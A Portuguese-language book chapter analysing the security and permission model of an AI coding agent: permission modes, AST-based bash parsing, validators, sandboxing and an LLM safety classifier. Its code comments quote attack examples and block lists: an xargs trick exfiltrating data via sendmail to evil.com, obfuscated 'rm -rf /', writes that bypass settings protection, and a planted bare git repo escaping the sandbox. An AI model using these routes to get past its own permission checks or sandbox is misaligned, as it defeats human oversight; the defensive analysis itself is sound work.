# Capítulo 10: Segurança e Modelo de Permissões

## 10.1 Visão Geral e Posicionamento

O modelo de segurança do Claude Code é o subsistema com maior volume de código e maior complexidade em todo o sistema, envolvendo aproximadamente 25.000 linhas de código-fonte TypeScript. O problema central que ele resolve é: **como conceder ao agente de IA a capacidade de executar comandos shell e modificar arquivos e, ao mesmo tempo, prevenir injeção de instruções maliciosas, vazamento de dados e destruição do sistema**.

Diferente de plugins tradicionais de IDE, o Claude Code enfrenta um modelo de ameaça único: o próprio modelo de IA pode ser guiado por prompt injection para executar operações perigosas; repositórios maliciosos clonados pelo usuário podem construir vetores de ataque através de nomes de arquivos ou conteúdo. O sistema de segurança deve estabelecer uma camada de verificação confiável entre a **saída do modelo** e o **sistema operacional**.

Todo o subsistema de segurança pode ser resumido por uma fórmula:

```
Decisão Final = f(modo de permissão, correspondência de regras, análise AST, validadores de segurança, validação de caminho, classificador, Hook, sandbox)
```

Não é um filtro de camada única, mas um sistema de defesa em profundidade de 8 camadas (Defense in Depth), onde cada camada funciona de forma independente, empilhando-se uma sobre a outra.

## 10.2 Bases Teóricas

### 10.2.1 Princípio do Mínimo Privilégio (Principle of Least Privilege)

O Claude Code nega por padrão todas as operações de escrita — cada chamada de ferramenta deve ser autorizada por `checkPermissions`. Os modos de permissão vão do mais restritivo (`default` — perguntar cada vez) ao mais permissivo (`bypassPermissions`); o usuário escolhe ativamente o nível de confiança.

### 10.2.2 Modelo de Sandbox (Sandboxing)

Integra `@anthropic-ai/sandbox-runtime`, usando `sandbox-exec` no macOS e `bubblewrap` (bwrap) no Linux, isolando acesso ao sistema de arquivos e rede no nível do sistema operacional. O sandbox é independente das verificações de permissão na camada de aplicação — mesmo que a camada de aplicação julgue mal, a camada de SO ainda bloqueia.

### 10.2.3 Aplicação de Análise AST no Domínio de Segurança

Diferente da correspondência tradicional por expressões regulares, o Claude Code usa análise completa de AST Bash (um parser compatível com tree-sitter implementado em TypeScript puro) para compreender a estrutura dos comandos. Esta é a pedra angular da verificação de segurança — regex não consegue distinguir `echo "rm -rf /"` de `rm -rf /`, mas o AST consegue.

### 10.2.4 Defesa em Profundidade (Defense in Depth)

As verificações de segurança estão distribuídas em 8 camadas independentes; a interceptação em qualquer camada pode bloquear operações perigosas. Mesmo que um atacante contorne a análise AST (como explorando differential do parser), ainda há validação de caminho, sandbox e confirmação do usuário como fallback.

## 10.3 Arquitetura do Modelo de Permissões

### 10.3.1 Cinco Níveis de Modo de Permissão

Os modos de permissão são definidos em `utils/permissions/PermissionMode.ts`, com cinco níveis em execução real:

| Modo | Comportamento | Cenário de Uso |
|------|---------------|----------------|
| `default` | Pergunta ao usuário a cada chamada de ferramenta | Primeiro uso, ambientes de alto risco |
| `acceptEdits` | Edições de arquivo aprovadas automaticamente; comandos ainda requerem confirmação | Desenvolvimento do dia a dia |
| `plan` | Apenas gera plano sem executar | Design de arquitetura, revisão de código |
| `auto` | Classificador LLM toma decisões automaticamente | Desenvolvedores de alta confiança |
| `bypassPermissions` | Pula todas as verificações de permissão | Cenários de confiança total (pode ser desabilitado por política) |

A mudança de modo tem lógica completa de transição de estado (`permissionSetup.ts:transitionPermissionMode`), incluindo:

- Ao entrar no modo `auto`, remove automaticamente regras de permissão perigosas (`stripDangerousPermissionsForAutoMode`)
- Ao sair do modo `auto`, restaura as regras removidas (`restoreDangerousPermissions`)
- Modo `plan` pode embutir modo `auto` (plan + auto-during-plan)

```typescript
// permissionSetup.ts:~580
export function transitionPermissionMode(
  fromMode: string,
  toMode: string,
  context: ToolPermissionContext,
): ToolPermissionContext {
  if (fromMode === toMode) return context
  // ...
  if (toUsesClassifier && !fromUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(true)
    context = stripDangerousPermissionsForAutoMode(context)
  } else if (fromUsesClassifier && !toUsesClassifier) {
    autoModeStateModule?.setAutoModeActive(false)
    context = restoreDangerousPermissions(context)
  }
}
```

### 10.3.2 Sistema de Regras de Permissão

As regras de permissão são o núcleo do controle granular, armazenadas em configuração multinível:

```typescript
// permissions.ts:~95
const PERMISSION_RULE_SOURCES = [
  ...SETTING_SOURCES, // userSettings, projectSettings, localSettings, flagSettings, policySettings
  'cliArg',
  'command',
  'session',
] as const
```

Cada regra contém três dimensões:
- **Source** (nível de origem): policySettings > flagSettings > localSettings > projectSettings > userSettings > session
- **Behavior** (comportamento): `allow` / `deny` / `ask`
- **RuleValue** (padrão de correspondência): ex. `Bash(git commit:*)` significa permitir todos os comandos que começam com `git commit`

A correspondência de regras suporta três modos:
1. **Correspondência a nível de ferramenta**: `Bash` corresponde a todos os comandos Bash
2. **Correspondência por prefixo**: `Bash(npm run:*)` corresponde a comandos que começam com `npm run`
3. **Correspondência exata**: `Bash(ls -la)` corresponde apenas a este comando

### 10.3.3 Fluxo Completo do Cascateamento de Permissões

Uma verificação de permissão de comando Bash flui por `bashToolHasPermission` (`bashPermissions.ts`), com o caminho completo:

```
1. Verificação de modo → bypassPermissions passa diretamente
2. Correspondência de regra deny → se atingida, nega
3. Correspondência de regra allow → se atingida, permite
4. Verificação de modo de segurança → tratamento especial para modos como acceptEdits
5. Análise AST do comando → tree-sitter produz comando estruturado
6. Cadeia de validadores de segurança → 23 verificações estáticas
7. Validação somente leitura → whitelist de comandos + whitelist de flags
8. Validação de caminho → restrições de diretório de trabalho
9. Classificador LLM (opcional) → decisão por IA no modo auto
10. Confirmação do usuário → salvaguarda final
```

## 10.4 Segurança de Comando Bash — Processo de Classificação em Oito Etapas

### 10.4.1 Análise AST com Tree-sitter

Esta é a inovação mais central de todo o sistema de segurança. `utils/bash/ast.ts` implementa análise de comandos bash baseada em AST:

```typescript
// ast.ts:~1-20
/**
 * AST-based bash command analysis using tree-sitter.
 *
 * The key design property is FAIL-CLOSED: we never interpret structure we
 * don't understand. If tree-sitter produces a node we haven't explicitly
 * allowlisted, we refuse to extract argv and the caller must ask the user.
 *
 * This is NOT a sandbox. It answers exactly one question: "Can we produce
 * a trustworthy argv[] for each simple command in this string?"
 */
```

Tipos de saída da análise AST:

```typescript
// ast.ts:~30
export type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType?: string }
  | { kind: 'parse-unavailable' }
```

Design chave: **Fail-Closed + Allowlist**. Qualquer tipo de nó AST não na allowlist faz o comando inteiro ser marcado como `too-complex`, exigindo confirmação do usuário. O conjunto `DANGEROUS_TYPES` define os tipos de nós conhecidamente perigosos:

```typescript
// ast.ts:~190
const DANGEROUS_TYPES = new Set([
  'command_substitution',   // substituição de comando $()
  'process_substitution',   // substituição de processo <() >()
  'expansion',              // expansão de parâmetro
  'subshell',               // subshell
  'for_statement',          // fluxo de controle
  'if_statement',
  'function_definition',
  'brace_expression',       // expansão de chaves
  // ... totalizando 18 tipos
])
```

### 10.4.2 Parser Bash Puro em TypeScript

`utils/bash/bashParser.ts` (4.436 linhas) é um parser completo de sintaxe Bash que produz AST compatível com o parser WASM tree-sitter-bash. Parâmetros de design chave:

```typescript
// bashParser.ts:~28
const PARSE_TIMEOUT_MS = 50    // timeout de 50ms, evita inputs maliciosos
const MAX_NODES = 50_000       // limite de nós, evita OOM
```

O parser suporta sintaxe completa Bash, incluindo heredoc, strings ANSI-C, substituição de processo, etc. Em caso de timeout ou explosão de nós, retorna `null` diretamente — fail-closed.

### 10.4.3 Classificador LLM (Bash Classifier)

Usado no modo `auto`. `bashClassifier.ts` mantém três grupos de regras de descrição de comandos:

- **Allow descriptions**: descrevem quais comandos são seguros (ex: "git read-only operations")
- **Deny descriptions**: descrevem quais comandos são perigosos (ex: "commands that download and execute code")
- **Ask descriptions**: padrões que requerem confirmação do usuário

O classificador usa `sideQuery` para chamar uma instância separada do Claude para julgamento, completamente isolada do diálogo principal.

### 10.4.4 Filtragem de Variáveis de Ambiente

`bashPermissions.ts` define dois grupos de whitelists de variáveis de ambiente seguras:

```typescript
// bashPermissions.ts:~390
const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'RUST_LOG', 'PYTHONUNBUFFERED', 'LANG', 'TZ',
  'NO_COLOR', 'FORCE_COLOR', // ... totalizando ~40
])
```

**Os comentários de segurança são particularmente valiosos** — o código-fonte marca explicitamente quais variáveis **nunca** devem ser adicionadas à whitelist:

```typescript
// bashPermissions.ts:~385 (comentário)
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH (module loading)
// - NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

### 10.4.5 23 Validadores de Segurança Shell

`bashSecurity.ts` implementa 23 validadores independentes, cada um com um ID numérico único:

```typescript
// bashSecurity.ts:~76
const BASH_SECURITY_CHECK_IDS = {
  INCOMPLETE_COMMANDS: 1,
  JQ_SYSTEM_FUNCTION: 2,
  JQ_FILE_ARGUMENTS: 3,
  OBFUSCATED_FLAGS: 4,
  SHELL_METACHARACTERS: 5,
  DANGEROUS_VARIABLES: 6,
  NEWLINES: 7,
  DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION: 8,
  DANGEROUS_PATTERNS_INPUT_REDIRECTION: 9,
  DANGEROUS_PATTERNS_OUTPUT_REDIRECTION: 10,
  IFS_INJECTION: 11,
  GIT_COMMIT_SUBSTITUTION: 12,
  PROC_ENVIRON_ACCESS: 13,
  MALFORMED_TOKEN_INJECTION: 14,
  BACKSLASH_ESCAPED_WHITESPACE: 15,
  BRACE_EXPANSION: 16,
  CONTROL_CHARACTERS: 17,
  UNICODE_WHITESPACE: 18,
  MID_WORD_HASH: 19,
  ZSH_DANGEROUS_COMMANDS: 20,
  BACKSLASH_ESCAPED_OPERATORS: 21,
  COMMENT_QUOTE_DESYNC: 22,
  QUOTED_NEWLINE: 23,
}
```

Alguns validadores dignos de nota:

**Detecção de substituição de comando** — não apenas detecta `$()`, mas também cobre superfícies de ataque específicas do Zsh:

```typescript
// bashSecurity.ts:~16
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion (=cmd)' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  // ... inclui também defesa preventiva contra sintaxe de comentário PowerShell
  { pattern: /<#/, message: 'PowerShell comment syntax' },
]
```

**Interceptação de comandos perigosos Zsh** — `zmodload` é o ponto de entrada do sistema de módulos Zsh, podendo carregar `zsh/system` (I/O de arquivo), `zsh/net/tcp` (comunicação de rede) e outros módulos:

```typescript
// bashSecurity.ts:~44
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',   // ponto de entrada de carregamento de módulo
  'emulate',    // flag -c é equivalente a eval
  'sysopen', 'sysread', 'syswrite',  // módulo zsh/system
  'zpty',       // execução de comando em pseudo-terminal
  'ztcp',       // comunicação de rede TCP
  'zf_rm', 'zf_mv', 'zf_chmod',     // comandos internos zsh/files
  // ...
])
```

### 10.4.6 Mecanismo de Validação Somente Leitura

`readOnlyValidation.ts` mantém um sistema de **whitelist de comandos + whitelist de flags**. Com `COMMAND_ALLOWLIST` como núcleo:

```typescript
// readOnlyValidation.ts:~55
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: { '-I': '{}', '-n': 'number', '-P': 'number', ... },
    // nota: -i e -e foram removidos devido a diferenças semânticas de arg opcional do GNU getopt
  },
  grep: { safeFlags: { '-e': 'string', '-i': 'none', ... } },
  sort: { safeFlags: { '-r': 'none', '-n': 'none', ... } },
  tree: { safeFlags: { ... } },  // -R removido: tree -R -H escreve arquivo
  date: { safeFlags: { ... }, additionalCommandIsDangerousCallback: ... },
  // ... totalizando aproximadamente 30 comandos
}
```

A whitelist de flags de cada comando tem comentários detalhados de segurança. Por exemplo, `-i` do `xargs` foi removido:

```typescript
// readOnlyValidation.ts:~130 (comentário)
// SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
// optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
// attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
// flag takes NO arg and `X` becomes the next positional (target command).
//
// `-i` (`i::` — optional replace-str):
//   echo /usr/sbin/sendm | xargs -it tail a@evil.com
//   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
//   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
```

Esse nível de análise de segurança — compreendendo as diferenças semânticas de arg opcional do GNU getopt que levam a diferencial de parser — é a parte mais impressionante de todo o modelo de segurança.

### 10.4.7 Validação de Caminho e Proteção contra Traversal

`pathValidation.ts` (1.303 linhas) implementa um sistema completo de segurança de caminhos:

**Extratores de caminho** — define parsers de argumento especializados para 34 tipos de comandos:

```typescript
// pathValidation.ts:~170
export const PATH_EXTRACTORS: Record<PathCommand, (args: string[]) => string[]> = {
  cd: args => (args.length === 0 ? [homedir()] : [args.join(' ')]),
  find: args => { /* lógica complexa de separação flag/caminho */ },
  grep: args => parsePatternCommand(args, flags),
  git: args => { /* tratamento especial para git diff --no-index */ },
  // ... 34 tipos ao total
}
```

**Tratamento de POSIX `--`** — trata corretamente o separador end-of-options, prevenindo que argumentos como `-path` contornem a validação de caminho:

```typescript
// pathValidation.ts:~105
// SECURITY: `rm -- -/../.claude/settings.local.json`
// aqui `-/../.claude/settings.local.json` começa com `-`,
// se `--` não for tratado, o filtro ingênuo !arg.startsWith('-') o descartaria,
// fazendo o validator ver 0 caminhos, retornar passthrough, e o arquivo ser deletado.
function filterOutFlags(args: string[]): string[] {
  const result: string[] = []
  let afterDoubleDash = false
  for (const arg of args) {
    if (afterDoubleDash) { result.push(arg) }
    else if (arg === '--') { afterDoubleDash = true }
    else if (!arg?.startsWith('-')) { result.push(arg) }
  }
  return result
}
```

**Proteção de caminhos de exclusão perigosos** — mesmo com regras allowlist, operações `rm` em caminhos críticos como `/`, `/etc`, `/home` sempre requerem confirmação do usuário:

```typescript
// pathValidation.ts:~70
function checkDangerousRemovalPaths(
  command: 'rm' | 'rmdir', args: string[], cwd: string
): PermissionResult {
  for (const path of paths) {
    if (isDangerousRemovalPath(absolutePath)) {
      return { behavior: 'ask', message: `Dangerous ${command} operation...` }
    }
  }
}
```

**Proteção contra ataque combinado cd + operação de escrita**:

```typescript
// pathValidation.ts:~490
// SECURITY: Block write operations in compound commands containing 'cd'
// Example attack: cd .claude/ && mv test.txt settings.json
// This would bypass the check for .claude/settings.json because paths
// are resolved relative to the original CWD.
if (compoundCommandHasCd && operationType !== 'read') {
  return { behavior: 'ask', message: '...' }
}
```

## 10.5 Cadeia de Validação do FileEdit

A cadeia de validação do FileEditTool é implementada no método `validateInput` de `FileEditTool.ts`, com 12 etapas:

| Etapa | Item de Verificação | Localização no Código |
|-------|---------------------|----------------------|
| 1 | Detecção de segredo do Team Memory | `checkTeamMemSecrets(fullFilePath, new_string)` |
| 2 | Verificação de sem alteração (old_string === new_string) | errorCode: 1 |
| 3 | Correspondência de regra Deny | `matchingRuleForInput(..., 'deny')` |
| 4 | Verificação de segurança de caminho UNC (previne vazamento NTLM) | `fullFilePath.startsWith('\\\\')` |
| 5 | Limite de tamanho de arquivo (1 GiB) | `MAX_EDIT_FILE_SIZE` |
| 6 | Detecção de codificação e leitura de arquivo | UTF-8 / UTF-16LE |
| 7 | Verificação de existência do arquivo | se não existe, old_string deve ser vazio |
| 8 | Interceptação de Jupyter Notebook | orienta para usar NotebookEditTool |
| 9 | **Must-Read-Before-Write** verificação | `readFileState.get(fullFilePath)` |
| 10 | **Detecção de modificação concorrente por mtime** | `lastWriteTime > readTimestamp.timestamp` |
| 11 | **Verificação de unicidade** | requer `replace_all: true` quando há múltiplas correspondências |
| 12 | Validação especial de arquivo Settings | `validateInputForSettingsFileEdit` |

As etapas 9 e 10 formam o invariante **"leia antes de escrever"**:

```typescript
// FileEditTool.ts:~250
const readTimestamp = toolUseContext.readFileState.get(fullFilePath)
if (!readTimestamp || readTimestamp.isPartialView) {
  return {
    result: false, behavior: 'ask',
    message: 'File has not been read yet. Read it first before writing to it.',
  }
}
// ...
const lastWriteTime = getFileModificationTime(fullFilePath)
if (lastWriteTime > readTimestamp.timestamp) {
  // Tratamento especial do Windows: sincronização em nuvem/antivírus pode alterar mtime sem mudar conteúdo
  if (isFullRead && fileContent === readTimestamp.content) {
    // conteúdo não mudou, passa com segurança
  } else {
    return { result: false, message: 'File has been modified since read...' }
  }
}
```

## 10.6 Mecanismo de Sandbox

### 10.6.1 Arquitetura do Adaptador de Sandbox

`utils/sandbox/sandbox-adapter.ts` (985 linhas) é a camada de adaptação de `@anthropic-ai/sandbox-runtime`, mapeando o sistema de configurações do Claude Code para a configuração do runtime do sandbox:

```typescript
// sandbox-adapter.ts:~160
export function convertToSandboxRuntimeConfig(
  settings: SettingsJson,
): SandboxRuntimeConfig {
  const allowWrite: string[] = ['.', getClaudeTempDir()]
  const denyWrite: string[] = []
  
  // sempre nega escrita em arquivos settings — previne escape do sandbox
  denyWrite.push(...settingsPaths)
  denyWrite.push(getManagedSettingsDropInDir())
  
  // nega escrita em .claude/skills — mesmo nível de permissão
  denyWrite.push(resolve(originalCwd, '.claude', 'skills'))
  
  // proteção contra ataque de repositório git bare
  for (const gitFile of ['HEAD', 'objects', 'refs', 'hooks', 'config']) {
    const p = resolve(dir, gitFile)
    try { statSync(p); denyWrite.push(p) }
    catch { bareGitRepoScrubPaths.push(p) }
  }
}
```

### 10.6.2 Proteção contra Ataque de Repositório Git Bare

Esta é uma medida de segurança sutil. Um atacante pode plantar arquivos `HEAD`, `objects/`, `refs/` no cwd, fazendo o `is_git_directory()` do Git julgar erroneamente o cwd como repositório bare, e então executar código arbitrário via configuração `core.fsmonitor`:

```typescript
// sandbox-adapter.ts:~245
// SECURITY: Git's is_git_directory() treats cwd as a bare repo if it has
// HEAD + objects/ + refs/. An attacker planting these (plus a config with
// core.fsmonitor) escapes the sandbox when Claude's unsandboxed git runs.

// estratégia: arquivos já existentes são bind-mounted como somente leitura; arquivos inexistentes são limpos após execução do comando
function scrubBareGitRepoFiles(): void {
  for (const p of bareGitRepoScrubPaths) {
    try { rmSync(p, { recursive: true }) }
    catch { /* ENOENT é situação normal */ }
  }
}
```

### 10.6.3 Estratégia de Isolamento de Rede

O sandbox suporta controle de rede a nível de domínio, extraindo domínios permitidos das regras de permissão da ferramenta WebFetch:

```typescript
// sandbox-adapter.ts:~190
for (const ruleString of permissions.allow || []) {
  const rule = permissionRuleValueFromString(ruleString)
  if (rule.toolName === WEB_FETCH_TOOL_NAME && 
      rule.ruleContent?.startsWith('domain:')) {
    allowedDomains.push(rule.ruleContent.substring('domain:'.length))
  }
}
```

A política empresarial pode forçar o uso apenas de domínios configurados pelo administrador via `allowManagedDomainsOnly`.

## 10.7 Sistema de Hook e Interação com Permissões

### 10.7.1 Hooks PreToolUse / PostToolUse

O sistema de Hook permite que usuários injetem lógica de segurança personalizada. `interactiveHandler.ts` demonstra como Hooks competem com decisões de permissão:

```typescript
// interactiveHandler.ts:~68
// competição de quatro vias: interação do usuário / Hook / classificador / Bridge(CCR)
// usa operação atômica claim() para garantir apenas um vencedor
void (async () => {
  if (isResolved()) return
  const hookDecision = await ctx.runHooks(
    currentAppState.toolPermissionContext.mode,
    result.suggestions,
    result.updatedInput,
    permissionPromptStartTimeMs,
  )
  if (!hookDecision || !claim()) return
  ctx.removeFromQueue()
  resolveOnce(hookDecision)
})()
```

### 10.7.2 Modelo de Competição Concorrente para Decisões de Permissão

`PermissionContext.ts` define `createResolveOnce` — um padrão "claim-then-resolve" que garante que apenas um vencedor emerge quando múltiplas fontes assíncronas (UI do usuário, Hook, classificador, Bridge, Channel) competem:

```typescript
// PermissionContext.ts:~80
function createResolveOnce<T>(resolve: (value: T) => void): ResolveOnce<T> {
  let claimed = false
  let delivered = false
  return {
    claim() {
      if (claimed) return false
      claimed = true
      return true
    },
    resolve(value: T) {
      if (delivered) return
      delivered = true; claimed = true
      resolve(value)
    },
  }
}
```

Esse design suporta competição concorrente de seis vias:
1. **UI local** — usuário clica em Allow/Deny no terminal
2. **Hook** — hook PreToolUse retorna decisão
3. **Bash Classifier** — classificador LLM julga segurança
4. **Bridge (CCR)** — decisão remota via UI Web do Claude.ai
5. **Channel** — resposta via canal Telegram/iMessage, etc.
6. **Recheck** — re-verificação automática após mudança de regras

## 10.8 Classificador YOLO (Classificador do Modo Auto)

### 10.8.1 Arquitetura

`yoloClassifier.ts` (1.495 linhas) implementa o classificador de segurança por IA do modo `auto`. É uma instância separada do Claude, chamada via `sideQuery`, completamente isolada do diálogo principal:

```typescript
// yoloClassifier.ts:~400
const YOLO_CLASSIFIER_TOOL_SCHEMA: BetaToolUnion = {
  type: 'custom',
  name: 'classify_result',
  input_schema: {
    type: 'object',
    properties: {
      thinking: { type: 'string' },
      shouldBlock: { type: 'boolean' },
      reason: { type: 'string' },
    },
  },
}
```

### 10.8.2 Classificador XML em Dois Estágios

O classificador suporta três modos de operação (`both` / `fast` / `thinking`), usando por padrão uma estratégia de dois estágios:

- **Estágio 1 (fast)**: max_tokens=64, nudge dá imediatamente uma decisão yes/no. Se julgado seguro, retorna diretamente.
- **Estágio 2 (thinking)**: acionado apenas quando o Estágio 1 julga "block"; usa raciocínio chain-of-thought, reduzindo falsos positivos.

```typescript
// yoloClassifier.ts:~680
const XML_S1_SUFFIX = '\nErr on the side of blocking. <block> immediately.'
const XML_S2_SUFFIX = '\nReview the classification process and follow it carefully...'
```

### 10.8.3 Compressão do Transcript

O classificador não recebe o histórico completo do diálogo, mas usa `buildTranscriptEntries` para comprimir o diálogo em formato compacto — mantendo apenas texto do usuário e blocos tool_use do assistente (excluindo texto do assistente, pois pode ser construído para influenciar o classificador):

```typescript
// yoloClassifier.ts:~480
// Only include tool_use blocks — assistant text is model-authored
// and could be crafted to influence the classifier's decision.
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

### 10.8.4 Otimização de Fast-Path

Antes de chamar o classificador, há três fast-paths que podem pular a chamada LLM:

1. **Simulação de acceptEdits**: se o comando seria aprovado automaticamente no modo `acceptEdits`, passa diretamente
2. **Whitelist de ferramenta segura**: `isAutoModeAllowlistedTool` mantém um conjunto de ferramentas seguras conhecidas
3. **Rastreamento de negação**: quando há muitas negações consecutivas, retorna para perguntar diretamente ao usuário

### 10.8.5 Remoção de Permissões Perigosas

Ao entrar no modo `auto`, as seguintes regras de permissão são automaticamente removidas (`stripDangerousPermissionsForAutoMode`):

```typescript
// permissionSetup.ts:~100
export function isDangerousBashPermission(toolName: string, ruleContent: string | undefined): boolean {
  // Bash(*) — permite todos os comandos
  if (ruleContent === undefined || ruleContent === '') return true
  // python:*, node:*, bash:* — interpretadores de script
  for (const pattern of DANGEROUS_BASH_PATTERNS) {
    if (content === `${lowerPattern}:*`) return true
    // ...
  }
}
```

Isso garante que mesmo que o usuário tenha salvo anteriormente uma regra ampla como `Bash(python:*)`, ela não contorna o classificador no modo `auto`.

## 10.9 Análise das Decisões de Design

### 10.9.1 Por que Análise AST em vez de Regex

Expressões regulares não conseguem lidar com ataques de **parser differential**. Por exemplo:

```bash
echo "rm -rf /"   # regex reportaria falso positivo — é apenas argumento do echo
rm -rf /           # é isso que regex deveria reportar
```

Mais perigoso ainda são **aspas aninhadas** e **expansão de shell**:

```bash
ev"al" 'rm -rf /'    # regex pode não ver eval
$'\x65\x76\x61\x6c' 'rm -rf /'  # eval codificado em string ANSI-C
```

O parser AST compreende estrutura sintática e consegue distinguir corretamente nomes de comandos de argumentos. E o design fail-closed significa que qualquer estrutura não parseável requer confirmação do usuário.

### 10.9.2 Momento de Introdução e Trade-off do Classificador LLM

O classificador é usado apenas no modo `auto`, com controle rigoroso de custo:

- **Latência**: design em dois estágios, Estágio 1 geralmente <100ms (max_tokens=64 + prompt cache)
- **Custo**: usa `sideQuery` via chamada de API independente, não conta no consumo de tokens do diálogo principal
- **Precisão**: chain-of-thought no Estágio 2 reduz falsos positivos a níveis razoáveis
- **Confiabilidade**: se o classificador não estiver disponível, fail-closed (retorna para perguntar ao usuário)

### 10.9.3 Equilíbrio entre Segurança e Usabilidade

O Claude Code equilibra ambos através de **confiança progressiva** (progressive trust):

1. Primeiro uso: cada comando requer confirmação
2. Após salvar regras: comandos correspondentes passam automaticamente
3. Modo `acceptEdits`: edições de arquivo passam automaticamente
4. Modo `auto`: classificador por IA julga
5. `bypassPermissions`: confiança total

Simultaneamente, através de **sugestões inteligentes** (`suggestionForExactCommand` / `suggestionForPrefix`), orienta os usuários a construírem gradualmente regras de confiança, em vez de ir de uma vez.

### 10.9.4 Comparação com Modelo de Segurança de Concorrentes

| Dimensão | Claude Code | Cursor | GitHub Copilot |
|----------|-------------|--------|----------------|
| Análise de comando | AST + 23 validadores | Regex básico | Não executa comandos |
| Sandbox | Nível de SO (sandbox-exec/bwrap) | Nenhum | N/A |
| Modelo de permissão | 5 níveis + regras granulares | Binário (permitir/negar) | N/A |
| Classificador por IA | Instância LLM independente | Nenhum | Nenhum |
| Validação de caminho | Parsers especializados para 34 comandos | Verificação básica | N/A |
| Política empresarial | Camada policySettings | Limitado | Política organizacional |

## 10.10 Padrões Transferíveis

1. **Padrão Allowlist Fail-Closed**: o princípio central da análise AST — compreender apenas estruturas sabidamente seguras; negar todo o resto. Aplicável a qualquer cenário que exija parsear entradas não confiáveis.

2. **Padrão de Concorrência Claim-then-Resolve**: `createResolveOnce` resolve o problema de competição de decisão de múltiplas fontes assíncronas. Reutilizável em qualquer cenário onde "o primeiro decisor a chegar vence".

3. **Escalada de Confiança Progressiva**: começar com o modo mais restrito, construindo gradualmente regras de confiança através do comportamento do usuário. Mais alinhado com a psicologia humana do que "escolher o nível de confiança logo de início".

4. **Classificador Fast-Path + Dois Estágios**: usar regras/whitelists/simulação para pular operações claramente seguras; chamar LLM apenas para operações incertas. A estratégia de dois estágios (fast + thinking) alcança equilíbrio entre latência e precisão.

5. **Defesa contra Parser Differential**: não apenas usar o próprio parser, mas verificar sistematicamente diferenças de funcionalidade de shell (GNU vs BSD getopt, regras de expansão Zsh vs Bash). Esse modo de pensar pode ser transferido para qualquer sistema envolvendo múltiplos interpretadores em camadas.

6. **Hierarquia de Nível de Origem para Regras de Permissão**: fusão de configuração em múltiplas camadas (policy > flag > local > project > user > session); política empresarial sempre vence. Modelo genérico de prioridade de configuração.

7. **Sandbox + Camada de Aplicação como Dupla Garantia**: mesmo que a verificação de permissão da camada de aplicação seja contornada, o sandbox do SO ainda bloqueia — e vice-versa. Duas falhas independentes em camadas.

## 10.11 Índice de Código-Fonte

| Arquivo | Linhas | Função Central |
|---------|--------|----------------|
| `tools/BashTool/bashPermissions.ts` | 2.621 | Ponto de entrada principal para decisão de permissão Bash, correspondência de regras, extração de prefixo de comando |
| `tools/BashTool/bashSecurity.ts` | 2.592 | 23 validadores de segurança, análise de aspas, detecção de substituição de comando |
| `tools/BashTool/readOnlyValidation.ts` | 1.990 | Whitelist de comandos, whitelist de flags, validação somente leitura |
| `tools/BashTool/pathValidation.ts` | 1.303 | Extratores de caminho para 34 comandos, detecção de caminhos perigosos |
| `tools/BashTool/BashTool.tsx` | 1.143 | Ponto de entrada da ferramenta Bash, schema de entrada, lógica de execução |
| `tools/BashTool/prompt.ts` | 369 | Prompt da ferramenta Bash, descrição do sandbox |
| `tools/FileEditTool/FileEditTool.ts` | ~400 | Cadeia de validação de 12 etapas para edição de arquivo |
| `utils/permissions/permissions.ts` | 1.486 | Ponto de entrada principal para decisão de permissão, correspondência de regras, integração com modo auto |
| `utils/permissions/permissionSetup.ts` | 1.532 | Configuração do modo de permissão, detecção e remoção de regras perigosas |
| `utils/permissions/yoloClassifier.ts` | 1.495 | Classificador LLM do modo Auto, protocolo XML de dois estágios |
| `utils/permissions/filesystem.ts` | 1.777 | Permissões de sistema de arquivos, segurança de caminho, proteção de configuração do Claude |
| `utils/bash/ast.ts` | 2.679 | Análise AST do Bash, travessia de nós allowlist |
| `utils/bash/bashParser.ts` | 4.436 | Parser Bash puro em TypeScript |
| `hooks/toolPermission/handlers/interactiveHandler.ts` | 536 | Tratamento interativo de permissão, modelo de competição de seis vias |
| `hooks/toolPermission/PermissionContext.ts` | 388 | Contexto de permissão, claim-then-resolve |
| `utils/sandbox/sandbox-adapter.ts` | 985 | Adaptação de configuração do sandbox, proteção contra repositório git bare |

---

*Este capítulo é baseado em um snapshot do código-fonte TypeScript do Claude Code (2026-03-31, ~512K LOC). O código relacionado à segurança abrange aproximadamente 25.000 linhas em 16 arquivos centrais. Todos os trechos de código foram copiados precisamente dos arquivos fonte com suas localizações anotadas.*
